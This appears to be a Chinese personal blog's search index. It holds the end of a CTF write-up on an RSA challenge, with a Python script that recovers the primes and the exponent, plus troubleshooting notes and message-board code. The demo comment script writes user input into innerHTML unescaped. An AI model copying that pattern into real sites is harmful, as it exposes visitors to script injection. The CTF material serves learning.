h3 )\n# h1,h2,h3可求出pqr的值\n\ne = getPrime(64)\n# 生成一个 64 bit 的随机素数 e，用作 RSA 公钥指数。\n\na_big_prime = getPrime( 512 )\n# 再生成一个 512 bit 的随机素数，起名叫 `a_big_prime`。\n# 注意：这个名字有误导性，它并不是 RSA 模数 N 的因子，只是额外生成的一个素数，用来产生另一条“hint”（？什么鬼\n\nhint = pow(a_big_prime,e,2**512)\n#计算\n# pow（a,b,c）=（a^b）%c\n# 在 CTF 语境里，这往往暗示“partial key exposure”——低 512 位泄漏\n# 攻击者可用 Coppersmith/Howgrave-Graham lattice 方法恢复完整私钥。\n# 不过本题真正解密不需要它，因为 e 很小且 n 的因子我们已能求出。\n\nprint( \"the big prime is: \" , a_big_prime )\nprint( \"hint is:\" , hint )\n\nn = p*q*r\n# 构造一个 3 素数 RSA 模数 n，长度 3×512 = 1536 bit。\nc = pow( m , e , n )\nprint( \"c=\" , c )\n# 输出密文 c\n\n'''\nhint_of_pqr= 26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427\n66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144 213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946\nthe big prime is:  11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921\nhint is: 10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505\nc= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711\n'''\n```\n自己解出来了但方法过于复杂，无参考价值，所以只保留学长wp作为存档。\n```\nfrom Cryptodome.Util.number import long_to_bytes as l2b\nimport sympy\n\nh1 =  26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427\nh2 =  66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144\nh3 =  213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946\na_big_prime =   11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921\nhint =  10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505\nc= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711\n#解方程\np = 3*h1 - h2\nr = (9*h1 - h3)//3\nq = h1 - p -r\n\n#解e\ne = sympy.discrete_log(2**512,hint,a_big_prime)\n\n#rsa算法\nn = p*q*r\nfain = (p-1)*(q-1)*(r-1)\nd = pow(e,-1,fain)\nm = pow(c,d,n)\nprint(l2b(m))\n```\n- 后续笔记见[bilibili速成crypto视频学习笔记](/2025/10/18/bilibili速成crypto视频学习笔记)","tags":["ctf","crypto","rsa"],"categories":["知识点笔记"]},{"title":"电脑求助存档","url":"/2025/08/07/电脑求助存档/","content":"2025-08-03 \n****问题：openlist挂载卡在使用raildrive mount进行其集成网盘映射至本地文件夹一步****\n解决：取消勾选网络https://选项\n反思：看攻略不够仔细，攻略中有这一步漏了\n\n2025-08-03\n****问题：openlist自启动文件失败****\n解决：没有放在同级文件夹\n反思：自动文件如.bat后缀文件，需要注意是否有放置位置要求\n\n2025-08-03\n****问题：桌面出现观看视频名称，具体表现为网页观看任一视频出现名称在桌面左上角，且位于fence分类界面下方****\n解决：是wallpaper engine的壁纸问题，具体原因不清楚，有大佬怀疑壁纸随音乐律动模块把媒体控件拉过来了\n反思：一开始一个个关闭桌面美化软件来确定问题来源时，漏了壁纸\n****","categories":["存档"]},{"title":"关于笔者","url":"/about/index.html","content":"\n## 作者联系方式\n- 邮箱：yluo3383@gmail.com\n\n## 关于本站\n- 框架：Hexo + GitHub + Butterfly\n\n如果你对本站有任何建议或发现链接失效、内容问题，欢迎在评论区留言或通过邮箱联系我。谢谢来访！\n"},{"title":"categories","url":"/categories/index.html"},{"url":"/html/try.html","content":"<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>留言板 - 弹幕互动</title>\n    <link rel=\"stylesheet\" href=\"comments.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>💬 留言板 & 弹幕互动</h1>\n            <p>留下您的想法，参与实时弹幕互动</p>\n        </div>\n        \n        <div class=\"content\">\n            <!-- 留言板区域 -->\n            <div class=\"comments-section\">\n                <div class=\"comment-form\">\n                    <h3>发表留言</h3>\n                    <form id=\"commentForm\">\n                        <div class=\"form-group\">\n                            <label for=\"name\">昵称</label>\n                            <input type=\"text\" id=\"name\" placeholder=\"请输入您的昵称\" required>\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"email\">邮箱</label>\n                            <input type=\"email\" id=\"email\" placeholder=\"请输入您的邮箱\">\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"message\">留言内容</label>\n                            <textarea id=\"message\" rows=\"4\" placeholder=\"请输入您的留言...\" required></textarea>\n                        </div>\n                        <button type=\"submit\" class=\"submit-btn\">发布留言</button>\n                    </form>\n                </div>\n                \n                <div class=\"comments-list\" id=\"commentsList\">\n                    <!-- 留言列表将通过 JavaScript 动态生成 -->\n                </div>\n            </div>\n            \n            <!-- 弹幕区域 -->\n            <div class=\"danmaku-section\">\n                <canvas id=\"danmakuCanvas\"></canvas>\n                <div class=\"danmaku-controls\">\n                    <div class=\"danmaku-input\">\n                        <input type=\"text\" id=\"danmakuInput\" placeholder=\"输入弹幕内容...\" maxlength=\"30\">\n                        <button class=\"danmaku-send\" onclick=\"sendDanmaku()\">发射</button>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <script src=\"comments.js\"></script>\n</body>\n</html>"},{"title":"友链","url":"/links/index.html","content":"\n欢迎交换友链，请将头像、昵称、希望出现的介绍信息发送至我的邮箱yluo3383@gmail.com(▰˘◡˘▰)\n"},{"title":"tags","url":"/tags/index.html"},{"title":"留言板","url":"/messageboard/index.html","content":"\n<div class=\"msgboard\">\n  <h2>最新评论（全站）</h2>\n  <div id=\"recent-comments\" class=\"recent-comments\"></div>\n  <div class=\"recent-actions\"><button id=\"load-more\" class=\"load-more\">加载更多</button></div>\n  <div id=\"twikoo-wrap\" class=\"twikoo-wrap\"></div>\n</div>\n\n<style>\n.msgboard { padding: 12px; }\n.recent-comments { max-height: 420px; overflow-y: auto; padding-right: 8px; }\n.tk-comment { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px dashed var(--text-color, #999); }\n.tk-avatar { width: 40px; height: 40px; flex: 0 0 40px; border-radius: 50%; overflow: hidden; }\n.tk-avatar img { width: 100%; height: 100%; object-fit: cover; }\n.tk-main { flex: 1 1 auto; }\n.tk-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }\n.tk-nick { font-weight: 600; line-height: 1.4; }\n.tk-content { line-height: 1.6; word-break: break-word; }\n.tk-footer { display: flex; justify-content: flex-end; align-items: center; gap: 10px; margin-top: 6px; color: var(--text-color, #666); font-size: 0.9em; }\n.tk-footer .tk-time { opacity: 0.85; }\n.tk-footer .tk-link { text-decoration: none; }\n.recent-actions { display: flex; justify-content: flex-end; margin-top: 6px; }\n.load-more { display: inline-block; padding: 4px 10px; font-size: 0.85em; border: 1px solid var(--text-color, #999); border-radius: 4px; background: var(--card-bg, transparent); color: var(--text-color, #666); cursor: pointer; }\n.load-more:hover { background: rgba(0,0,0,0.05); }\n.load-more:disabled { opacity: 0.6; cursor: not-allowed; }\n</style>\n\n<script>\n(function(){\n  const envId = 'https://twikoo-vercel01.vercel.app';\n  const titleCache = new Map();\n  let displayedCount = 10; // 初始显示 10 条\n  let cacheList = [];      // 最近一次获取的列表缓存\n  let isLoadingMore = false;\n  let fullList = [];       // 缓存最多 50 条，供“加载更多”使用\n\n  function escapeHTML(html){\n    const div = document.createElement('div');\n    div.textContent = html == null ? '' : String(html);\n    return div.innerHTML;\n  }\n  function sanitizeContent(str){\n    if (!str) return '';\n    let s = String(str);\n    // 如果出现 <div 或 &lt;div，直接截断至该位置，后面的页面内容全部不要\n    const idxRealDiv = s.search(/<div\\b/i);\n    const idxEscDiv = s.search(/&lt;div\\b/i);\n    const cutIdx = (idxRealDiv >= 0 && idxEscDiv >= 0) ? Math.min(idxRealDiv, idxEscDiv) : (idxRealDiv >= 0 ? idxRealDiv : idxEscDiv);\n    if (cutIdx >= 0) s = s.slice(0, cutIdx);\n    // 统一换行\n    s = s.replace(/<br\\s*\\/?>(\\r\\n|\\n)?/gi, '\\n');\n    // 移除整段 div（真实标签），包含内部内容（截断后理论上不再出现，但保留以防万一）\n    s = s.replace(/<div(?:\\s[^>]*)?>[\\s\\S]*?<\\/div>/gi, '');\n    // 移除整段 div（已转义标签），包含内部内容（防御性保留）\n    s = s.replace(/&lt;div(?:\\s[^&]*)&gt;[\\s\\S]*?&lt;\\/div&gt;/gi, '');\n    // 移除常见标签本身（保留内部内容）：p/hr/span/i（真实）\n    s = s.replace(/<\\/?(p|hr|span|i)[^>]*>/gi, '');\n    // 移除其他真实 HTML 标签（保留文本）\n    s = s.replace(/<[^>]+>/g, '');\n    // 移除常见标签的已转义形式（保留内部内容）\n    s = s.replace(/&lt;\\/?(p|hr|span|i)[^&]*&gt;/gi, '');\n    // 移除其他已转义 HTML 标签\n    s = s.replace(/&lt;[^&]+&gt;/g, '');\n    // 额外移除纯文本关键词“div”（大小写不敏感，独立词）\n    s = s.replace(/\\bdiv\\b/gi, '');\n    // 转义并将换行还原为 <br>\n    return escapeHTML(s.trim()).replace(/\\n/g, '<br>');\n  }\n  function formatTime(ts){\n    try { return new Date(ts).toLocaleString(); } catch(e){ return ''; }\n  }\n  async function resolveTitle(path){\n    if (!path) return '评论位置';\n    if (titleCache.has(path)) return titleCache.get(path);\n    const url = path.startsWith('http') ? path : (location.origin + path);\n    try {\n      const resp = await fetch(url, { credentials: 'omit' });\n      const html = await resp.text();\n      const m = html.match(/<title>(.*?)<\\/title>/i);\n      let title = m ? m[1].trim() : '评论位置';\n      title = title.replace(/\\s*\\|\\s*[^|]+$/, '');\n      titleCache.set(path, title);\n      return title;\n    } catch(e){\n      titleCache.set(path, '评论位置');\n      return '评论位置';\n    }\n  }\n\n  function render(items){\n    const container = document.getElementById('recent-comments');\n    if (!container) return;\n    const frag = document.createDocumentFragment();\n    items.forEach(e => {\n      const linkUrl = (e && e.url) ? (e.url + (e.id ? ('#' + e.id) : '')) : '#';\n      const wrapper = document.createElement('div');\n      wrapper.className = 'tk-comment';\n      wrapper.innerHTML = `\n        <div class=\\\"tk-avatar\\\">\\n          <img src=\\\"${escapeHTML(e.avatar || '')}\\\" alt=\\\"avatar\\\">\\n        </div>\\n        <div class=\\\"tk-main\\\">\\n          <div class=\\\"tk-header\\\">\\n            <span class=\\\"tk-nick\\\">${escapeHTML(e.nick || '匿名')}</span>\\n          </div>\\n          <div class=\\\"tk-content\\\">${sanitizeContent(e.comment)}</div>\\n          <div class=\\\"tk-footer\\\">\\n            <span class=\\\"tk-time\\\">${formatTime(e.created)}</span>\\n            <a class=\\\"tk-link\\\" href=\\\"${escapeHTML(linkUrl)}\\\" target=\\\"_blank\\\">评论位置</a>\\n          </div>\\n        </div>`;\n      frag.appendChild(wrapper);\n      resolveTitle(e.url).then(title => {\n        const a = wrapper.querySelector('.tk-link');\n        if (a) a.textContent = title || '评论位置';\n      });\n    });\n    container.innerHTML = '';\n    container.appendChild(frag);\n  }\n\n  async function refresh(){\n    try {\n      const Twikoo = window.twikoo;\n      if (!Twikoo || !Twikoo.getRecentComments) return;\n      // 拉取更多（最多 50 条），前端仅显示 displayedCount 条\n      const res = await Twikoo.getRecentComments({ envId, pageSize: 50 });\n      const list = (res || []).map(e => ({\n        avatar: e.avatar,\n        nick: e.nick,\n        comment: e.comment,\n        url: e.url,\n        id: e.id,\n        created: e.created\n      }));\n      fullList = list;\n      const countToShow = Math.min(displayedCount, fullList.length);\n      const container = document.getElementById('recent-comments');\n      const prevTop = container ? container.scrollTop : 0;\n      render(fullList.slice(0, countToShow));\n      if (container) container.scrollTop = prevTop;\n      updateLoadMoreState(displayedCount < fullList.length);\n    } catch(err){\n      console.warn('获取最新评论失败', err);\n    }\n  }\n\n  // 首次加载：等待 Twikoo 脚本就绪再刷新\n  const waitTwikoo = setInterval(() => {\n    if (window.twikoo && window.twikoo.getRecentComments) {\n      clearInterval(waitTwikoo);\n      refresh();\n    }\n  }, 500);\n\n  // 评论提交后 3 秒刷新：兼容按钮 id/class 两种情况\n  document.addEventListener('click', (e) => {\n    const t = e.target;\n    if (!t) return;\n    if (t.id === 'tk-submit' || t.classList.contains('tk-submit')) {\n      setTimeout(refresh, 3000);\n    }\n  });\n\n  // 轮询刷新，保持滚动区最新（保留当前滚动位置）\n  setInterval(async () => {\n    const c = document.getElementById('recent-comments');\n    const top = c ? c.scrollTop : 0;\n    await refresh();\n    if (c) c.scrollTop = top;\n  }, 10000);\n\n  // 加载更多（每次再显示 10 条更早的评论，使用 fullList，无需二次请求）\n  const loadMoreBtn = document.getElementById('load-more');\n  function updateLoadMoreState(hasMore){\n    if (!loadMoreBtn) return;\n    loadMoreBtn.disabled = !hasMore;\n    loadMoreBtn.textContent = hasMore ? '加载更多' : '没有更多了';\n  }\n  if (loadMoreBtn) {\n    loadMoreBtn.addEventListener('click', async () => {\n      if (isLoadingMore) return;\n      isLoadingMore = true;\n      try {\n        const newCount = Math.min(displayedCount + 10, fullList.length);\n        if (newCount === displayedCount) {\n          updateLoadMoreState(false);\n        } else {\n          const c = document.getElementById('recent-comments');\n          const top = c ? c.scrollTop : 0;\n          displayedCount = newCount;\n          render(fullList.slice(0, displayedCount));\n          if (c) c.scrollTop = top;\n          updateLoadMoreState(displayedCount < fullList.length);\n        }\n      } catch(err) {\n        console.warn('加载更多失败', err);\n      } finally {\n        isLoadingMore = false;\n      }\n    });\n  }\n})();\n</script>\n\n<p style=\"margin-top:16px; font-weight: 600;\">欢迎留言交流~ 下方可直接评论，提交后会显示在上方“最新评论”里。</p>"},{"title":"留言板","url":"/try/index.html","content":"\n<link rel=\"stylesheet\" href=\"/comments/comments.css\">\n\n<div class=\"container\">\n    <!-- 这里粘贴上面的HTML内容 -->\n    <!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>留言板 - 弹幕互动</title>\n    <link rel=\"stylesheet\" href=\"comments.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>💬 留言板 & 弹幕互动</h1>\n            <p>留下您的想法，参与实时弹幕互动</p>\n        </div>\n        \n        <div class=\"content\">\n            <!-- 留言板区域 -->\n            <div class=\"comments-section\">\n                <div class=\"comment-form\">\n                    <h3>发表留言</h3>\n                    <form id=\"commentForm\">\n                        <div class=\"form-group\">\n                            <label for=\"name\">昵称</label>\n                            <input type=\"text\" id=\"name\" placeholder=\"请输入您的昵称\" required>\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"email\">邮箱</label>\n                            <input type=\"email\" id=\"email\" placeholder=\"请输入您的邮箱\">\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"message\">留言内容</label>\n                            <textarea id=\"message\" rows=\"4\" placeholder=\"请输入您的留言...\" required></textarea>\n                        </div>\n                        <button type=\"submit\" class=\"submit-btn\">发布留言</button>\n                    </form>\n                </div>\n                \n                <div class=\"comments-list\" id=\"commentsList\">\n                    <!-- 留言列表将通过 JavaScript 动态生成 -->\n                </div>\n            </div>\n            \n            <!-- 弹幕区域 -->\n            <div class=\"danmaku-section\">\n                <canvas id=\"danmakuCanvas\"></canvas>\n                <div class=\"danmaku-controls\">\n                    <div class=\"danmaku-input\">\n                        <input type=\"text\" id=\"danmakuInput\" placeholder=\"输入弹幕内容...\" maxlength=\"30\">\n                        <button class=\"danmaku-send\" onclick=\"sendDanmaku()\">发射</button>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <script src=\"comments.js\"></script>\n</body>\n</html>\n</div>\n\n<script src=\"/comments/comments.js\"></script>"},{"url":"/html/css/try.css","content":"* {\n    margin: 0;\n    padding: 0;\n    box-sizing: border-box;\n}\n\nbody {\n    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n    min-height: 100vh;\n    padding: 20px;\n}\n\n.container {\n    max-width: 1200px;\n    margin: 0 auto;\n    background: rgba(255, 255, 255, 0.95);\n    border-radius: 20px;\n    overflow: hidden;\n    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);\n}\n\n.header {\n    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);\n    color: white;\n    padding: 40px;\n    text-align: center;\n}\n\n.header h1 {\n    font-size: 2.5rem;\n    margin-bottom: 10px;\n}\n\n.header p {\n    font-size: 1.2rem;\n    opacity: 0.9;\n}\n\n.content {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 0;\n    min-height: 600px;\n}\n\n/* 留言板样式 */\n.comments-section {\n    padding: 30px;\n    background: white;\n    border-right: 1px solid #eee;\n}\n\n.comment-form {\n    background: #f8f9fa;\n    padding: 20px;\n    border-radius: 15px;\n    margin-bottom: 30px;\n}\n\n.form-group {\n    margin-bottom: 15px;\n}\n\n.form-group label {\n    display: block;\n    margin-bottom: 5px;\n    font-weight: 600;\n    color: #333;\n}\n\n.form-group input,\n.form-group textarea {\n    width: 100%;\n    padding: 12px;\n    border: 2px solid #e9ecef;\n    border-radius: 8px;\n    font-size: 14px;\n    transition: border-color 0.3s;\n}\n\n.form-group input:focus,\n.form-group textarea:focus {\n    outline: none;\n    border-color: #4facfe;\n}\n\n.submit-btn {\n    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n    color: white;\n    border: none;\n    padding: 12px 30px;\n    border-radius: 25px;\n    cursor: pointer;\n    font-size: 16px;\n    font-weight: 600;\n    transition: transform 0.3s;\n}\n\n.submit-btn:hover {\n    transform: translateY(-2px);\n}\n\n.comments-list {\n    max-height: 400px;\n    overflow-y: auto;\n}\n\n.comment-item {\n    background: white;\n    padding: 15px;\n    margin-bottom: 15px;\n    border-radius: 10px;\n    border-left: 4px solid #4facfe;\n    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);\n}\n\n.comment-header {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    margin-bottom: 8px;\n}\n\n.comment-author {\n    font-weight: bold;\n    color: #333;\n}\n\n.comment-time {\n    color: #666;\n    font-size: 12px;\n}\n\n.comment-content {\n    color: #555;\n    line-height: 1.5;\n}\n\n/* 弹幕区域样式 */\n.danmaku-section {\n    position: relative;\n    background: #1a1a1a;\n    overflow: hidden;\n}\n\n#danmakuCanvas {\n    position: absolute;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n}\n\n.danmaku-controls {\n    position: absolute;\n    bottom: 20px;\n    left: 0;\n    right: 0;\n    padding: 0 20px;\n    z-index: 10;\n}\n\n.danmaku-input {\n    display: flex;\n    gap: 10px;\n}\n\n.danmaku-input input {\n    flex: 1;\n    padding: 12px;\n    border: none;\n    border-radius: 25px;\n    background: rgba(255, 255, 255, 0.9);\n}\n\n.danmaku-send {\n    background: #ff4757;\n    color: white;\n    border: none;\n    padding: 12px 20px;\n    border-radius: 25px;\n    cursor: pointer;\n    font-weight: 600;\n}\n\n/* 响应式设计 */\n@media (max-width: 768px) {\n    .content {\n        grid-template-columns: 1fr;\n    }\n    \n    .comments-section {\n        border-right: none;\n        border-bottom: 1px solid #eee;\n    }\n    \n    .header h1 {\n        font-size: 2rem;\n    }\n    \n    .header {\n        padding: 30px 20px;\n    }\n}"},{"url":"/html/js/try.js","content":"// 留言板功能\nconst commentForm = document.getElementById('commentForm');\nconst commentsList = document.getElementById('commentsList');\n\n// 从 localStorage 加载留言\nfunction loadComments() {\n    const comments = JSON.parse(localStorage.getItem('comments')) || [];\n    commentsList.innerHTML = '';\n    \n    comments.forEach(comment => {\n        const commentElement = document.createElement('div');\n        commentElement.className = 'comment-item';\n        commentElement.innerHTML = `\n            <div class=\"comment-header\">\n                <span class=\"comment-author\">${comment.name}</span>\n                <span class=\"comment-time\">${comment.time}</span>\n            </div>\n            <div class=\"comment-content\">${comment.message}</div>\n        `;\n        commentsList.appendChild(commentElement);\n    });\n}\n\n// 提交留言\ncommentForm.addEventListener('submit', function(e) {\n    e.preventDefault();\n    \n    const name = document.getElementById('name').value;\n    const email = document.getElementById('email').value;\n    const message = document.getElementById('message').value;\n    \n    const comment = {\n        name: name,\n        email: email,\n        message: message,\n        time: new Date().toLocaleString('zh-CN')\n    };\n    \n    // 保存到 localStorage\n    const comments = JSON.parse(localStorage.getItem('comments')) || [];\n    comments.unshift(comment);\n    localStorage.setItem('comments', JSON.stringify(comments));\n    \n    // 清空表单\n    commentForm.reset();\n    \n    // 重新加载留言\n    loadComments();\n    \n    // 同时发送弹幕\n    sendDanmaku(message, name);\n});\n\n// 弹幕功能\nconst canvas = document.getElementById('danmakuCanvas');\nconst ctx = canvas.getContext('2d');\nlet danmakus = [];\n\n// 初始化画布\nfunction initCanvas() {\n    canvas.width = canvas.offsetWidth;\n    canvas.height = canvas.offsetHeight;\n}\n\n// 弹幕类\nclass Danmaku {\n    constructor(text, color = '#fff') {\n        this.text = text;\n        this.color = color;\n        this.x = canvas.width;\n        this.y = Math.random() * (canvas.height - 50) + 25;\n        this.speed = 2 + Math.random() * 2;\n        this.opacity = 1;\n        this.fontSize = 18 + Math.random() * 10;\n    }\n    \n    update() {\n        this.x -= this.speed;\n        return this.x > -200;\n    }\n    \n    draw() {\n        ctx.save();\n        ctx.globalAlpha = this.opacity;\n        ctx.font = `bold ${this.fontSize}px Arial`;\n        ctx.fillStyle = this.color;\n        ctx.fillText(this.text, this.x, this.y);\n        \n        // 添加文字阴影\n        ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';\n        ctx.shadowBlur = 10;\n        ctx.shadowOffsetX = 2;\n        ctx.shadowOffsetY = 2;\n        ctx.restore();\n    }\n}\n\n// 发送弹幕\nfunction sendDanmaku(text = null, author = null) {\n    const input = document.getElementById('danmakuInput');\n    const danmakuText = text || input.value;\n    \n    if (danmakuText.trim()) {\n        const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57', '#ff9ff3'];\n        const color = colors[Math.floor(Math.random() * colors.length)];\n        \n        let displayText = danmakuText;\n        if (author && !text) {\n            displayText = `${author}: ${danmakuText}`;\n        }\n        \n        danmakus.push(new Danmaku(displayText, color));\n        \n        if (!text) {\n            input.value = '';\n        }\n    }\n}\n\n// 动画循环\nfunction animate() {\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n    \n    // 更新和绘制所有弹幕\n    danmakus = danmakus.filter(danmaku => danmaku.update());\n    danmakus.forEach(danmaku => danmaku.draw());\n    \n    requestAnimationFrame(animate);\n}\n\n// 初始化\nwindow.addEventListener('load', function() {\n    initCanvas();\n    loadComments();\n    animate();\n    \n    // 添加一些示例弹幕\n    setTimeout(() => {\n        sendDanmaku('欢迎来到留言板！');\n        sendDanmaku('这个页面真不错~');\n        sendDanmaku('大家快来留言呀！');\n        sendDanmaku('弹幕效果很酷！');\n        sendDanmaku('支持实时互动！');\n    }, 1000);\n});\n\nwindow.addEventListener('resize', initCanvas);\n\n// 回车发送弹幕\ndocument.getElementById('danmakuInput').addEventListener('keypress', function(e) {\n    if (e.key === 'Enter') {\n        sendDanmaku();\n    }\n});\n\n// 添加随机弹幕生成（可选）\nsetInterval(() => {\n    const randomMessages = [\n        '这个留言板很棒！',\n        '弹幕效果很流畅',\n        '界面设计很漂亮',\n        '功能很实用',\n        '支持实时互动',\n        '用户体验很好'\n    ];\n    const randomMessage = randomMessages[Math.floor(Math.random() * randomMessages.length)];\n    sendDanmaku(randomMessage);\n}, 10000); // 每10秒发送一条随机弹幕"},{"url":"/img/friends/README.html","content":"将友链头像统一放在本目录。\n\n建议命名规范：\n- 使用全小写字母、数字与短横线，例如：`example.png`、`my-friend.jpg`\n- 尽量使用正方形或圆形裁剪的头像，尺寸 96x96 或 128x128\n\n使用步骤：\n1. 将图片拷贝到 `source/img/friends/` 目录\n2. 在 `source/_data/link.yml` 文件中，将 `avatar` 字段设置为 `/img/friends/图片文件名`\n3. 生成或预览站点，即可在友链页面看到头像\n\n"}]